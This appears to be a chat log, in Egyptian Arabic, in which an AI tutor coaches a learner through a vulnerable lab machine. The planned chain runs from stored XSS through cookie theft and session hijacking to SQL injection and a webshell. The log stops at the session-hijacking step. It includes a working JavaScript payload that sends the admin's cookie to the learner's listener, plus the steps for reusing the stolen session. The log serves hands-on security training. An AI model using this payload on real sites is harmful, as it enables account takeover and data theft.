تمام، خليني أشوف المشين دي الأول.تمام، اتفرجت عليها. دي مشين ممتازة جداً ليك دلوقتي — هتجمع فيها كل اللي اتعلمته مع بعض.

---

## 🧠 البيكتشر الكبير — إيه اللي هنعمله؟

المشين دي بتعلمك **attack chain** (سلسلة هجوم) من 3 مراحل:

```
XSS  →  سرقة Session Cookie  →  Admin Access  →  SQL Injection  →  RCE
```

يعني مش هجوم واحد — ده **سيناريو كامل** زي اللي بتلاقيه في الواقع. كل خطوة بتفتحلك الخطوة الجاية.

---

## 🗺️ الـ Attack Chain بالتفصيل

### المرحلة 1 — XSS → Cookie Theft (سرقة الكوكي)

- فيه **stored XSS** (إكس إس إس مخزن) في صفحة عامة
- هتحقن JavaScript بيسرق الـ **session cookie** (كوكي الجلسة) بتاع الـ admin
- الـ admin لما يزور الصفحة، الـ cookie بتتبعت لك

### المرحلة 2 — Session Hijacking (اختطاف الجلسة)

- تاخد الـ cookie دي وتحطها في المتصفح بدل cookie بتاعتك
- فجأة بقيت admin من غير ما تعرف الباسورد

### المرحلة 3 — SQL Injection + MySQL FILE → RCE

- في الـ admin panel فيه **SQL injection**
- MySQL
عندها privilege اسمه **FILE** بيخليك تكتب ملفات على السيرفر
- هتكتب **PHP webshell** (ويب شيل) على السيرفر عن طريق الـ SQL injection
- وتاخد **RCE** (تنفيذ أوامر عن بُعد — "آر سي إي")

---

## ✅ الخطوة الأولى دلوقتي

المشين ISO — يعني بتشتغل كـ Live system. لازم:

**1. تاخد الـ IP بتاعها:**

```bash
nmap -sn 192.168.96.0/24
```

أو لو عارف الـ subnet بتاع الـ VMware بتاعك، دور على الـ IP الجديد.

**2. بعد ما تاخد الـ IP، افتح المتصفح وروح عليه مباشرة:**

```
http://<IP>
```

شيفني الـ IP بتاعها وإيه اللي شايفه في المتصفح.


تمام! ده بالظبط اللي بنستنى نلاقيه.

---

## 🧠 إيه اللي شايفينه؟

عندك **صفحتين مهمتين:**

- **Login page** — هنرجعلها بعدين
- **Comment page** — دي هي نقطة الدخول الأولى

صفحة الـ comment دي = **المكان المرشح للـ Stored XSS**

---

## 🎯 المنطق الهجومي

صفحة الكومنت بتاخد input من المستخدم وبتعرضه للناس التانيين — لو مفيش **sanitization** (تنظيف المدخلات)، ممكن تحقن JavaScript وتتخزن في الداتابيز، وأي حد يفتح الصفحة — حتى الـ admin — الكود بتاعك هيشتغل في المتصفح بتاعه.

---

## ✅ الخطوة دلوقتي — اختبار XSS بسيط

روح صفحة الكومنت واكتب الـ payload ده:

```html
<script>alert(1)</script>
```

ابعته كـ comment وشوف إيه اللي بيحصل.

**في 3 احتمالات:**

|النتيجة|معناها|
|---|---|
|ظهر popup فيه رقم 1|✅ XSS شغال، نكمل|
|الكومنت اتنشر بس مفيش popup|❌ في filter، هنحتاج bypass|
|الكومنت ما اتنشرش خالص|❌ في blocking كامل|

شيفني إيه اللي حصل.



ممتاز! 🎯 الـ XSS شغال — دلوقتي الجزء المهم.

---

## 🧠 إيه اللي هنعمله دلوقتي؟

الـ `alert(1)` كان بس للتأكيد. الهدف الحقيقي هو **سرقة الـ session cookie بتاع الـ admin.**

الفكرة:

```
أنت تحقن JS  →  الـ admin يفتح الصفحة  →  
الـ JS بتسرق الـ cookie بتاعه  →  بتبعتها لسيرفرك
```

---

## ✅ الخطوات

### الخطوة 1 — شغّل HTTP server على الكالي بتاعك

```bash
python3 -m http.server 8888
```

> ده بيعمل سيرفر بسيط بيسمع على بورت 8888 — أي request جاي هيظهر في الـ terminal

---

### الخطوة 2 — احقن الـ payload ده في الكومنت

```html
<script>document.location='http://192.168.96.1:8888/?c='+document.cookie</script>
```

> **`192.168.96.1`** = الـ IP بتاع الكالي بتاعك — تأكد منه بـ `ip a`

**المنطق:** لما الـ admin يفتح الصفحة، الـ JS هتاخد الـ cookie بتاعه وتبعتها لسيرفرك كـ parameter في الـ URL.

---

### الخطوة 3 — استنى وشوف الـ terminal

هتلاقي request وصلك شكله كده:

```
GET /?c=PHPSESSID=xxxxxxxxxxxxxxxx HTTP/1.1
```

الـ `PHPSESSID` ده هو الـ cookie بتاع الـ admin.

---

جرب وشيفني إيه اللي ظهر في الـ terminal.


🎯 الـ cookie وصلت!

```
PHPSESSID=jcu892ck554a593n46vahm7ub3
```

---

## ✅ الخطوة الجاية — Session Hijacking

دلوقتي هنستخدم الـ cookie دي عشان ندخل كـ admin.

### في المتصفح:

1. افتح `http://192.168.96.134`
2. افتح **Developer Tools** → `F12`
3. روح تاب **Application** (في Chrome) أو **Storage** (في Firefox)
4. في الشمال لقي **Cookies** → `http://192.168.96.134`
5. غير قيمة الـ `PHPSESSID` بالقيمة دي:

```
jcu892ck554a593n46vahm7ub3
```

6. **Refresh الصفحة**

شيفني إيه اللي حصل بعد الـ refresh.